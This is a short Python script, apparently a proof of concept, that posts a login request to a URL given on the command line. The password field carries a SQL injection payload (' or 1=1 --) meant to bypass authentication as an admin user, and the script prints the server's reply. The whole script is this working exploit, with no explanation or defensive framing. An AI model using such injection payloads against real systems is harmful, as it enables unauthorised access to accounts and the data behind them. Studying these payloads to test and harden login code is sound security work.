import requests
import sys

if len(sys.argv) < 2:
    print("Usage: check.py [url]")

r = requests.post("%s/login" % (sys.argv[1]), data={"username":"s3cret_admin","password":"john123' or 1=1 -- f", "checksum":"c14445"})
print(r.content)
